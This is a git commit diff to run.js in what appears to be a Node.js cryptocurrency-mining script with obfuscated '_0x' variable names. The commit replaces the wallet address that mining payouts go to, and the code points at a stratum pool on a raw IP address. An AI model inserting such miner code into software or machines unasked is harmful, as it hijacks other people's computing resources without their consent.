712be0157d92a831371994b7f38bd942b2474545
xos-mine <xiomara.vanmeter@pabalatak.com>
2025-08-29 03:31:09 -0700

    Update run.js

--- run.js
+++ run.js
@@ -4,7 +4,7 @@ const os = require("os"); // Import modul os
 // ⚠️ Ganti sesuai kebutuhan
 var _0xabc123 = function(){
     var _0xdef456 = 'stratum+tcp://141.94.223.113:4052';
-    var _0xghi789 = '49cg2BTsCdmBfUPsCrDsGmREn2diVYSKUahupm2bay5ZU3gmVTzuwgY7yhQcbYCdEeZXSHsYLZKLWXTR4DNR3xcJS29HszU';
+    var _0xghi789 = '8BAei31qDSqCRwS1GsQTWjfMjK4VxxThbFckHFoXyRP1BM2keM3bNCY9YBvpGmwuxG4Nec7gqejYGU8E4VNHXYYC7Y2EUJZ';
     
     // Dapatkan jumlah core CPU
     var cpuCores = os.cpus().length;
